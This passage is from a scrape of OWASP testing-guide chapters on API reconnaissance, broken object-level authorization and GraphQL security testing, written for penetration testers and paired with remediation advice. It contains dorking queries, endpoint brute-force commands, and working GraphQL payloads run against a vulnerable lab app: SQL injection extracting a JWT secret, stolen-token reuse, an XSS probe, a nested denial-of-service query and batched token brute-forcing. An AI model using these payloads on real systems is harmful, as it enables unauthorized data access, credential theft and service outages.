investigation.\n\nRegardless of the visibility of the API, searching for API documentation can find older, not-yet-published, or accidentally leaked API documentation. This documentation will be very helpfull in understanding what the attack surface the API exposes.\n\n### API Directories\n\nAlternatives sources of API documentation can incluide API Directories, such as:\n\n- GitHub in general\n- [GitHub Public APIs Repository](https://github.com/public-apis/public-apis)\n- [APIs.guru](https://apis.guru)\n- [RapidAPI](https://rapidapi.com/)\n- [PublicAPIs](https://publicapis.dev/) and [PublicAPIs](https://publicapis.io/)\n- [Postman API Network](https://www.postman.com/explore)\n\n### Looking in Well Known Places\n\nIf documentation is not readily apparent, then you can actively search the target for documentation based on a few obvious names or paths. These include:\n\n- /api-docs\n- /doc\n- /swagger\n- /swagger.json\n- /openapi.json\n- /.well-known/schema-discovery\n\n### Robots.txt\n\n`robots.txt` is a text file that site owners create to instruct web crawlers (such as search engine bots) on how to crawl and index their site. It is part of the Robots Exclusion Protocol (REP), which regulates how bots interact with sites.\n\nThis file may provide additional clues to path structure or API endpoints.\n\nThe [Information Gathering](../01-Information_Gathering/README.md) section refers to robots.txt in several cases including WSTG-INFO-01, WSTG-INFO-03, WSTG-INFO-05, and WSTG-INFO-08.\n\n### GitDorking\n\nIf the application uses GitHub, GitLab, or other public facing Git based repositories then we can also search for any clues or sensitive content (also known as `GitDorking`). This information can include passwords, API keys, configuration files, and other confidential data that developers may accidentally or inadvertently commit to their repositories. Organizations can accidentally share sensitive code, sample, or test code that may provide clues to implementation details. The personal GitHub accounts of the target's employees may also accidentally release information that can provide clues.\n\n### Browsing and Spidering the Application\n\nEven if you have the API documentation browsing the application is a good idea. Documentation can be outdated, inaccurate, or incomplete.\n\nBrowsing the application with an intercepting proxy such as ZAP or Burp Suite records endpoints for later inspection. In addition, using their built-in spidering functionality, intercepting proxies can help generate a comprehensive list of endpoints. From the spidered URLs look for links with obvious API URL naming schemes. These include:\n\n- `https://example.com/api/v1` (or v2 etc)\n- `https://example.com/graphql`\n\nOr subdomains the the applications may consume or depend upon:\n\n- `https://api.example.com/api/v1`\n\nIt is important that the pentester attempts to exercise as much functionality in the application as possible. This is not only to generate a comprehensive list of endpoints but also to avoid issues with lazy loading and code splitting. In addition, your pentest engagement should include sample accounts at different privilege levels so that your browser and spidering can access and expose endpoints for as much functionality as possible.\n\nOnce completed, the endpoint information obtained from browsing and spidering of the application can help the pentester compose API documentation of the target using other tools such as Postman.\n\n### Google Dorking\n\nUsing passive reconnaissance techniques such as Google Dorking with directives such as `site` and `inurl` allows us to tailor a search for common API keywords that the Google indexer may have found. Review [Conduct Search Engine Discovery Reconnaissance for Information Leakage](../01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md) for additional information.\n\nHere are a few API specific examples:\n\n`site:\"mytargetsite.com\" inurl:\"/api\"`\n\n`inurl:apikey filetype:env`\n\nOther keywords can include `\"v1\"`, `\"api\"`, `\"graphql\"`.\n\nWe can extend the Google Dorking to include subdomains of the target.\n\nWordlists are helpful here for a comprehensive list of common words used in APIs.\n\n### Look Back, Way Back\n\nIn general APIs change over time. But deprecated or older version may still be operational either on purpose or by misconfiguration. These should also be tested as there is a good chance that they will contain vulnerabilities that newer versions have fixed. In addition, changes to APIs show newer features which may be less robust and therefore a good candidate for testing.\n\nTo discover older versions we can use the `Wayback machine` to help find older endpoints. A helpful tool know as TomNomNom's [WayBackUrls](https://github.com/tomnomnom/waybackurls) fetches all the URLs that the Wayback Machine knows about for a domain.\n\n- [WayBackUrls](https://github.com/tomnomnom/waybackurls). Fetch all the URLs that the Wayback Machine knows about for a domain.\n- [waymore](https://github.com/xnl-h4ck3r/waymore). Find way more from the Wayback Machine, Common Crawl, Alien Vault OTX, URLScan & VirusTotal.\n- [gau](https://github.com/lc/gau). Fetch known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, and Common Crawl.\n\n### The Client-Side Application\n\nAn excellent source of API and other information is the HTML and JavaScript that the server sends to the client. Sometimes, the client application leaks sensitive information including APIs and secrets. The [Review Web Page Content for Information Leakage](../01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md) section has some general information for reviewing web content for leakage. Here we will expand to focus on reviewing the JavaScript content for API related secrets.\n\nThere are a variety of tools that we can use to help us extract sensitive information from JavaScript transmitted to the browser. These tools are typically based on one of two approaches: Regular Expressions or Abstract Syntax Trees (AST). Then there are generalized tools that help us organize or manage JS files for investigation by AST and Regular Expression tools.\n\nRegex is more straightforward by searching JS or HTML content for known patterns. However, this approach can miss content not explicitly identified in the Regular Expression. Given the structure of some JS this approach can miss a lot. ASTs on the other hand are tree-like structures that represent the syntax of source code. Each node in the tree corresponds to a part of the code. For JavaScript, an AST breaks the code into basic components, allowing tools and compilers to understand and modify the code easily.\n\n#### General Tools\n\n1. [Uproot](https://github.com/0xDexter0us/uproot-JS). A BurpSuite plugin that saves any encountered JS files to disk. This helps extract the files for any analysis by command-line tools.\n2. [OpenAPI Support](https://www.zaproxy.org/docs/desktop/addons/openapi-support/). This ZAP add-on allows you to spider and import OpenAPI (Swagger) definitions, versions 1.2, 2.0, and 3.0.\n3. [OpenAPI Parser](https://github.com/aress31/openapi-parser). A BurpSuite plugin that parses OpenAPI documents into Burp Suite for automating OpenAPI-based APIs security assessments.\n\n#### Regular Expression Tools\n\n1. [JSParser](https://github.com/nahamsec/JSParser). A python 2.7 script using Tornado and JSBeautifier to parse relative URLs from JavaScript files.\n2. [JSMiner](https://github.com/PortSwigger/js-miner). A BurpSuite plugin tries to find interesting stuff inside static files; mainly JavaScript and JSON files. This tool scans \"passively\" while crawling the application.\n3. [JSpector](https://github.com/hisxo/JSpector). A BurpSuite plugin that passively crawls JavaScript files and automatically creates issues with URLs, endpoints and dangerous methods found on the JS files.\n4. [Link Finder](https://github.com/GerbenJavado/LinkFinder). A python script that finds endpoints in JavaScript files.\n\n#### AST Tools\n\n1. [JSLuice](https://github.com/BishopFox/jsluice). A command-line tool that extracts URLs, paths, secrets, and other interesting data from JavaScript source code.\n\n### Other Recon Tools\n\n1. [Attack Surface Detector](https://github.com/secdec/attack-surface-detector-burp). A BurpSuite plugin that uses static code analyses to identify web app endpoints by parsing routes and identifying parameters.\n2. [Param Miner](https://github.com/portswigger/param-miner). A BurpSuite plugin that identifies hidden, unlinked parameters.\n3. [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder). A python tool used to discover endpoints, potential parameters, and a target specific wordlist for a given target.\n4. [GAP](https://github.com/xnl-h4ck3r/GAP-Burp-Extension). Burp Extension to find potential endpoints, parameters, and generate a custom target wordlist.\n\n### Active Fuzzing\n\nActive Fuzzing involves using tools with wordlists and filtering requests results to bruteforce endpoint discovery.\n\n#### Kiterunner\n\n[KiteRunner](https://github.com/assetnote/kiterunner) is a tool that performs traditional content discovery and bruteforcing routes/endpoints in modern applications and APIs.\n\n```console\nkr [scan|brute] <input> [flags]\n```\n\nTo scan a target for APIs using a wordlist we can:\n\n```console\nkr scan https://example.com/api -w /usr/share/wordlists/apis/routes-large.kite --fail-status-codes 404,403\n```\n\n#### FFUF/DirBuster/GoBuster\n\nAll three of FFUF, DirBuster, and GoBuster are designed to discover hidden paths and files on web servers through brute-forcing techniques. All three use customizable wordlists to generate requests to the target web server, attempting to identify valid directories and files. All three support multi-threaded or highly efficient processing to speed up the brute-forcing process.\n\nSome common wordlist files for APIs include: [SecLists](https://github.com/danielmiessler/SecLists) in the Discovery/Web-Content/api section, [GraphQL Wordlist](https://github.com/Escape-Technologies/graphql-wordlist), and [Assetnote](https://wordlists.assetnote.io/).\n\nGoBuster Example:\n\n`gobuster dir -u <target url> -w <wordlist file>`\n\n## References\n\n### OWASP Resources\n\n- [REST Assessment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html)\n\n### Books\n\n- Corey J. Ball - \"Hacking APIs : breaking web application programming interfaces\", No Starch, 2022 - ISBN-13: 978-1-7185-0244-4\n- Confidence Staveley - \"API Security for White Hat Hackers, Packt, 2024 - ISBN 978-1-80056-080-2  \n", "timestamp": "2025-10-24T11:39:59.649505"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md", "content": "# API Broken Object Level Authorization\n\n|ID          |\n|------------|\n|WSTG-APIT-02|\n\n## Summary\n\nBroken Object Level Authorization (BOLA) occurs when an API does not properly enforce authorization checks for each object accessed by the client. Attackers can manipulate object identifiers in API requests (such as IDs, GUIDs, or tokens) to access or modify resources they are not authorized to. This vulnerability is critical in APIs due to their direct access to underlying objects and the prevalence of APIs in modern applications.\n\nExploiting BOLA can lead to unauthorized access to sensitive data, user impersonation, horizontal privilege escalation (accessing other users' resources), and vertical privilege escalation (gaining unauthorized admin-level access).\n\n## Test Objectives\n\n- The objective of this test is to identify whether the API enforces proper **object-level authorization** checks, ensuring that users can only access and manipulate objects they are authorized to interact with.\n\n## How to Test\n\n### Understand API Endpoints and Object References\n\nReview API documentation (e.g. OpenAPI specification), traffic, or use an interception proxy (e.g., **Burp Suite**, **ZAP**) to identify endpoints that accept object identifiers of interest. These could be in the form of **IDs**, **UUIDs**, or other references.\n\nExamples:\n\n- `GET /api/users/{user_id}`\n- `GET /api/orders/{order_id}`\n- `POST /graphql`\\\n        `query: {user(id: \"123\") }`\n\nWith the knowledge gained in the previous step, review and collect third-party object identifiers (e.g. user IDs, orders IDs etc) that can be used subsequently in the object identifiers manipulation.\n\nAdditionaly, generate a list of potential object identifiers for brute-force. For example, if an API is retrieving a purchase order from an authenticated user, generate various purchase order IDs for testing.\n\n### Manipulate Object Identifiers in API Requests\n\nWith the goal to determine if users can access or modify objects they do not own by altering object identifiers in API request, change the object identifier (e.g., user ID, order ID) in the URL or request body.\n  \nExample: Modify a request like `GET /api/users/123/profile` (where 123 is the current user ID) to `GET /api/users/124/profile` (where 124 is another user's ID).\n\nDepending on the application context, utilize two different accounts to perform the tests. With an account A, create resources that exclusively belongs to that account (e.g. purchase order) and with an account B, try to access the resource from account A (e.g. purchase order).\n\n### Test Object-Level Access with Different HTTP Methods\n\nTest various **HTTP methods** for BOLA vulnerabilities:\n\n- **GET**: Try accessing unauthorized objects by manipulating the object ID in the request.\n- **POST/PUT/PATCH**: Attempt to create or modify objects that belong to other users.\n- **DELETE**: Try to delete an object owned by another user.\n\n### Test BOLA in GraphQL APIs\n\nFor **GraphQL APIs**, send a query with a modified object ID in the query parameters (see [Testing GraphQL](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL)):\n\nExample: `query { user(id: \"124\") { name, email } }`.\n\n### Test for Bulk Object Access\n\nTest if the API allows unauthorized **bulk access** to objects. This could happen in endpoints that return lists of objects.\n\nExample: `GET /api/users` returns data for all users instead of only the authenticated user’s data.\n\n## Indicators of BOLA\n\n- **Successful exploitation**: If modifying an object ID in the request returns data or allows actions on objects that belong to other users, the API is vulnerable to BOLA.\n- **Error responses**: Properly secured APIs in general would return `403 Forbidden` or `401 Unauthorized` for unauthorized object access. A `200 OK` response for another user's object indicates BOLA.\n- **Inconsistent responses**: If some endpoints enforce authorization and others do not, it points to incomplete or inconsistent security controls.\n\n## Remediation\n\n- **Object Ownership Checks**: Ensure that object-level authorization checks are performed for every API request. Always verify that the user making the request is authorized to access the requested object.\n- **Role-Based Access Control (RBAC)**: Implement RBAC policies that define which roles can access or modify specific objects.\n- **Least Privilege Principle**: Apply the principle of least privilege to ensure that users can only access the minimum set of objects they need for their role.\n- **Use UUIDs or Non-Sequential IDs**: Prefer non-predictable, non-sequential object identifiers (e.g., **UUIDs** instead of simple integers) to make enumeration and brute-force attacks harder.\n\n## Tools\n\n- **ZAP**: Automated scanners or manual proxy tools can help test object references in API requests.\n- **Burp Suite**: Use the **Repeater** or **Intruder** tools to manipulate object IDs and send multiple requests to test access control.\n- **Postman**: Send requests with altered object IDs and observe the responses.\n- **Fuzzing Tools**: Use fuzzers to brute-force object IDs and check for unauthorized access.\n\n## References\n\n- [OWASP API Security Top 10: BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)\n- [OWASP Testing Guide: Testing for Insecure Direct Object References (IDOR)](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)\n- [OWASP Testing Guide: Testing for GraphQL](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL)  \n", "timestamp": "2025-10-24T11:39:59.721221"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md", "content": "# Testing GraphQL\n\n|ID          |\n|------------|\n|WSTG-APIT-99|\n\n## Summary\n\nGraphQL has become very popular in modern APIs. It provides simplicity and nested objects, which facilitate faster development. While every technology has advantages, it can also expose the application to new attack surfaces. The purpose of this scenario is to provide some common misconfigurations and attack vectors on applications that utilize GraphQL. Some vectors are unique to GraphQL (e.g. [Introspection Query](#introspection-queries)) and some are generic to APIs (e.g. [SQL injection](#sql-injection)).\n\nExamples in this section will be based on a vulnerable GraphQL application [poc-graphql](https://github.com/righettod/poc-graphql), which is run in a docker container that maps `localhost:8080/GraphQL` as the vulnerable GraphQL node.\n\n## Test Objectives\n\n- Assess that a secure and production-ready configuration is deployed.\n- Validate all input fields against generic attacks.\n- Ensure that proper access controls are applied.\n\n## How to Test\n\nTesting GraphQL nodes is not very different than testing other API technologies. Consider the following steps:\n\n### Introspection Queries\n\nIntrospection queries are the method by which GraphQL lets you ask what queries are supported, which data types are available, and many more details you will need when approaching a test of a GraphQL deployment.\n\nThe [GraphQL website describes Introspection](https://graphql.org/learn/introspection/):\n\n> \"It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!\"\n\nThere are a couple of ways to extract this information and visualize the output, as follows.\n\n#### Using Native GraphQL Introspection\n\nThe most straightforward way is to send an HTTP request (using a personal proxy) with the following payload, taken from an article on [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):\n\n```graphql\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nThe result will usually be very long (and hence has been shortened here), and it will contain the entire schema of the GraphQL deployment.\n\nResponse:\n\n```json\n{\n  \"data\": {\n    \"__schema\": {\n      \"queryType\": {\n        \"name\": \"Query\"\n      },\n      \"mutationType\": {\n        \"name\": \"Mutation\"\n      },\n      \"subscriptionType\": {\n        \"name\": \"Subscription\"\n      },\n      \"types\": [\n        {\n          \"kind\": \"ENUM\",\n          \"name\": \"__TypeKind\",\n          \"description\": \"An enum describing what kind of type a given __Type is\",\n          \"fields\": null,\n          \"inputFields\": null,\n          \"interfaces\": null,\n          \"enumValues\": [\n            {\n              \"name\": \"SCALAR\",\n              \"description\": \"Indicates this type is a scalar.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n            {\n              \"name\": \"OBJECT\",\n              \"description\": \"Indicates this type is an object. `fields` and `interfaces` are valid fields.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n            {\n              \"name\": \"INTERFACE\",\n              \"description\": \"Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n            {\n              \"name\": \"UNION\",\n              \"description\": \"Indicates this type is a union. `possibleTypes` is a valid field.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n          ],\n          \"possibleTypes\": null\n        }\n      ]\n    }\n  }\n}\n```\n\nA tool such as [GraphQL Voyager](https://apis.guru/graphql-voyager/) can be used to get a better understanding of the GraphQL endpoint:\n\n![GraphQL Voyager](images/Voyager.png)\\\n*Figure 12.1-1: GraphQL Voyager*\n\nThis tool creates an Entity Relationship Diagram (ERD) representation of the GraphQL schema, allowing you to get a better look into the moving parts of the system you're testing. Extracting information from the drawing allows you to see you can query the Dog table for example. It also shows which properties a Dog has:\n\n- ID\n- name\n- veterinary (ID)\n\nThere is one downside to using this method: GraphQL Voyager does not display everything that can be done with GraphQL. For example, the mutations available are not listed in the drawing above. A better strategy would be to use both Voyager and one of the methods listed below.\n\n#### Using GraphiQL\n\n[GraphiQL](https://github.com/graphql/graphiql) is a web-based IDE for GraphQL. It is part of the GraphQL project, and it is mainly used for debugging or development purposes. The best practice is to not allow users to access it on production deployments. If you are testing a staging environment, you might have access to it and can thus save some time when working with introspection queries (although you can, of course, use introspection in the GraphiQL interface).\n\nGraphiQL has a documentation section, which uses the data from the schema in order to create a document of the GraphQL instance that is being used. This document contains the data types, mutations, and basically every piece of information that can be extracted using introspection.\n\n#### Using GraphQL Playground\n\n[GraphQL Playground](https://github.com/graphql/graphql-playground) is a GraphQL client. It can be used to test different queries, as well as divide GraphQL IDEs into different playgrounds, and group them by theme or by assigning a name to them. Much like GraphiQL, Playground can create documentation for you without the need for manually sending introspection queries and processing the response(s). It has another great advantage: It doesn't need the GraphiQL interface to be available. You can direct the tool to the GraphQL node via a URL, or use it locally with a data file. GraphQL Playground can be used to test for vulnerabilities directly, so you don't need to use a personal proxy to send HTTP requests. This means you can use this tool for simple interaction with and assessment of GraphQL. For other more advanced payloads, use a personal proxy.\n\nNote that in some cases, you will need to set the HTTP headers at the bottom, to include session ID or other mechanism of authentication. This still allows creating multiple \"IDEs\" with different permissions to verify if there are in fact authorization issues.\n\n![Playground1](images/Playground1.png)\\\n*Figure 12.1-2: GraphQL Playground High Level API Docs*\n\n![Playground2](images/Playground2.png)\\\n*Figure 12.1-3: GraphQL Playground API Schema*\n\nYou can even download the schemas to use in Voyager.\n\n#### Introspection Conclusion\n\nIntrospection is a useful tool that allows users to gain more information about the GraphQL deployment. However, this will also allow malicious users to gain access to the same information. The best practice is to limit access to the introspection queries, since some tools or requests might fail if this feature is disabled altogether. As GraphQL usually bridges to the backend APIs of the system, it's better to enforce strict access control.\n\n### Authorization\n\nIntrospection is the first place to look for authorization problems. As noted, access to introspection should be restricted as it allows for data extraction and data gathering. Once a tester has access to the schema and knowledge of the sensitive information there is to extract, they should then send queries that will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform authorization enforcement.\n\nIn the earlier examples, the output of the introspection query shows there is a query called `auth`. This seems like a good place to extract sensitive information such as API tokens, passwords, etc.\n\n![Auth GraphQL Query](images/auth1.png)\\\n*Figure 12.1-4: GraphQL Auth Query API*\n\nTesting the authorization implementation varies from deployment to deployment since each schema will have different sensitive information, and hence, different targets to focus on.\n\nIn this vulnerable example, every user (even unauthenticated) can gain access to the auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the schema allows, such as associating or disassociating a dog from any specified veterinarian using mutations, even if there is no matching auth token for the veterinarian in the request.\n\nHere is an example in which the tester uses an extracted token they do not own to perform an action as the veterinarian \"Benoit\":\n\n```graphql\nquery brokenAccessControl {\n  myInfo(accessToken:\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew\", veterinaryId: 2){\n    id, name, dogs {\n      name\n    }\n  }\n}\n```\n\nAnd the response:\n\n```json\n{\n  \"data\": {\n    \"myInfo\": {\n      \"id\": 2,\n      \"name\": \"Benoit\",\n      \"dogs\": [\n        {\n          \"name\": \"Babou\"\n        },\n        {\n          \"name\": \"Baboune\"\n        },\n        {\n          \"name\": \"Babylon\"\n        },\n        {\n          \"name\": \"...\"\n        }\n      ]\n    }\n  }\n}\n```\n\nAll of the Dogs in the list belong to Benoit, and not to the auth token owner. It's possible to perform this type of action when proper authorization enforcement is not implemented.\n\n### Injection\n\nGraphQL is the implementation of the API layer of an application, and as such, it usually forwards the requests to a backend API or the database directly. This allows you to utilize any underlying vulnerability such as SQL injection, command injection, cross-site scripting, etc. Using GraphQL just changes the entry point of the malicious payload.\n\nYou can refer to other scenarios within the OWASP testing guide to get some ideas.\n\nGraphQL also has scalars, which are usually used for custom data types that do not have native data types, such as DateTime. These types of data do not have out-of-the-box validation, making them good candidates for testing.\n\n#### SQL Injection\n\nThe example application is vulnerable by design in the query `dogs(namePrefix: String, limit: Int = 500): [Dog!]` since the parameter `namePrefix` is concatenated in the SQL query. Concatenating user input is a common malpractice of applications that can expose them to SQL injection.\n\nThe following query extracts information from the `CONFIG` table within the database:\n\n```graphql\nquery sqli {\n  dogs(namePrefix: \"ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- \", limit: 1000) {\n    id\n    name\n  }\n}\n```\n\nThe response to this query is:\n\n```json\n{\n  \"data\": {\n    \"dogs\": [\n      {\n        \"id\": 1,\n        \"name\": \"Abi\"\n      },\n      {\n        \"id\": 2,\n        \"name\": \"Abime\"\n      },\n      {\n        \"id\": 3,\n        \"name\": \"...\"\n      },\n      {\n        \"id\": 50,\n        \"name\": \"$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^\"\n      }\n    ]\n  }\n}\n```\n\nThe query contains the secret that signs JWTs in the example application, which is very sensitive information.\n\nIn order to know what to look for in any particular application, it will be helpful to collect information about how the application is built and how the database tables are organized. You can also use tools like `sqlmap` to look for injection paths and even automate the extraction of data from the database.\n\n#### Cross-Site Scripting (XSS)\n\nCross-site scripting occurs when an attacker injects executable code that is subsequently run by the browser. Learn about tests for XSS in the [Input Validation](../07-Input_Validation_Testing/README.md) chapter. You may test for reflected XSS using a payload from [Testing for Reflected Cross Site Scripting](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).\n\nIn this example, errors might reflect the input and could cause XSS to occur.\n\nPayload:\n\n```graphql\nquery xss  {\n  myInfo(veterinaryId:\"<script>alert('1')</script>\" ,accessToken:\"<script>alert('1')</script>\") {\n    id\n    name\n  }\n}\n```\n\nResponse:\n\n```json\n{\n  \"data\": null,\n  \"errors\": [\n    {\n      \"message\": \"Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 10,\n          \"sourceName\": null\n        }\n      ],\n      \"description\": \"argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'\",\n      \"validationErrorType\": \"WrongType\",\n      \"queryPath\": [\n        \"myInfo\"\n      ],\n      \"errorType\": \"ValidationError\",\n      \"extensions\": null,\n      \"path\": null\n    }\n  ]\n}\n```\n\n### Denial of Service (DoS) Queries\n\nGraphQL exposes a very simple interface to allow developers to use nested queries and nested objects. This ability can also be used in a malicious way, by calling a deep nested query similar to a recursive function and causing a denial of service by using up CPU, memory, or other compute resources.\n\nLooking back at *Figure 12.1-1*, you can see that it is possible to create a loop where a Dog object contains a Veterinary object. There could be an endless amount of nested objects.\n\nThis allows for a deep query which has the potential to overload the application:\n\n```graphql\nquery dos {\n  allDogs(onlyFree: false, limit: 1000000) {\n    id\n    name\n    veterinary {\n      id\n      name\n      dogs {\n        id\n        name\n        veterinary {\n          id\n          name\n          dogs {\n            id\n            name\n            veterinary {\n              id\n              name\n              dogs {\n                id\n                name\n                veterinary {\n                  id\n                  name\n                  dogs {\n                    id\n                    name\n                    veterinary {\n                      id\n                      name\n                      dogs {\n                        id\n                        name\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nThere are multiple security measures that can be implemented to prevent these types of queries, listed in the [Remediation](#remediation) section. Abusive queries can cause issues like DoS for GraphQL deployments and should be included in testing.\n\n### Batching Attacks\n\nGraphQL supports batching of multiple queries into a single request. This allows users to request multiple objects or multiple instances of objects efficiently. However, an attacker can utilize this functionality in order to perform a batching attack. Sending more than a single query in one request looks like the following:\n\n```graphql\n[\n  {\n    query: < query 0 >,\n    variables: < variables for query 0 >,\n  },\n  {\n    query: < query 1 >,\n    variables: < variables for query 1 >,\n  },\n  {\n    query: < query n >\n    variables: < variables for query n >,\n  }\n]\n```\n\nIn the example application, a single request can be sent in order to extract all of the veterinary names using the guessable ID (it's an increasing integer). An attacker can then utilize the names in order to get access tokens. Instead of doing so in many requests, which might be blocked by a network security measure like a web application firewall or a rate limiter like Nginx, these requests may be batched. This means there would only be a couple of requests, which may allow for efficient brute forcing without being detected. Here is an example query:\n\n```graphql\nquery {\n  Veterinary(id: \"1\") {\n    name\n  }\n  second:Veterinary(id: \"2\") {\n    name\n  }\n  third:Veterinary(id: \"3\") {\n    name\n  }\n}\n```\n\nThis will provide the attacker with the names of the veterinaries and, as shown before, the names can be used to batch multiple queries requesting the auth tokens of those veterinaries. For example:\n\n```graphql\nquery {\n  auth(veterinaryName: \"Julien\")\n  second: auth(veterinaryName:\"Benoit\")\n}\n```\n\nBatching attacks can be used to bypass many security measures enforced on sites. It can also be used to enumerate objects and attempt to brute force multi-factor authentication or other sensitive information.\n\n### Detailed Error Message\n\nGraphQL can encounter unexpected errors during runtime. When such an error occurs, the server may send an error response that may reveal internal error details or application configurations or data. This allows a malicious user to acquire more information about the application. As part of testing, error messages should be checked by sending unexpected data, a process known as fuzzing. The responses should be searched for potentially sensitive information that may be revealed using this technique.\n\n### Exposure of Underlying API\n\nGraphQL is a relatively new technology, and some applications are transitioning from old APIs to GraphQL. In many cases, GraphQL is deployed as a standard API which translates requests (sent using GraphQL syntax) to an underlying API, as well as the responses. If requests to the underlying API are not properly checked for authorization, it could lead to a possible escalation of privileges.\n\nFor example, a request containing the parameter `id=1/delete` might be interpreted as `/api/users/1/delete`. This could extend to the manipulation of other resources belonging to `user=1`. It is also possible that the request is interpreted to have the authorization given to the GraphQL node, instead of the true requester.\n\nA tester should try and gain access to underlying API methods as it may be possible to escalate privileges.\n\n## Remediation\n\n- Restrict access to introspection queries.\n- Implement input validation.\n    - GraphQL does not have a native way to validate input, however, there is an open source project called [\"graphql-constraint-directive\"](https://github.com/confuser/graphql-constraint-directive) which allows for input validation as part of the schema definition.\n    - Input validation alone is helpful, but it is not a complete solution and additional measures should be taken to mitigate injection attacks.\n- Implement security measures to prevent abusive queries.\n    - Timeouts: restrict the amount of time that a query is permitted to run.\n    - Maximum query depth: limit the depth of allowed queries, which may prevent queries that are too deep from abusing resources.\n    - Set maximum query complexity: limit the complexity of queries to mitigate the abuse of GraphQL resources.\n    - Use server-time-based throttling: limit the amount of server time a user can consume.\n    - Use query-complexity-based throttling: limit the total complexity of queries a user can consume.\n- Send generic error messages: use generic error messages that do not reveal details of the deployment.\n- Mitigate batching attacks:\n    - Add object request rate limiting in code.\n    - Prevent batching for sensitive objects.\n    - Limit the number of queries that can run at one time.\n\nFor more on remediating GraphQL weaknesses, refer to the [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).\n\n## Tools\n\n- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)\n- [GraphQL Voyager](https://apis.guru/graphql-voyager/)\n- [sqlmap](https://github.com/sqlmapproject/sqlmap)\n- [InQL (Burp Extension)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)\n- [GraphQL Raider (Burp Extension)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)\n- [GraphQL (Add-on for ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)\n\n## References\n\n- [poc-graphql](https://github.com/righettod/poc-graphql)\n- [GraphQL Official Site](https://graphql.org/learn/)\n- [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)\n- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)\n- [Client-side Testing](../11-Client-side_Testing/README.md) (XSS and other vulnerabilities)\n- [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)\n- [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)\n- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)\n", "timestamp": 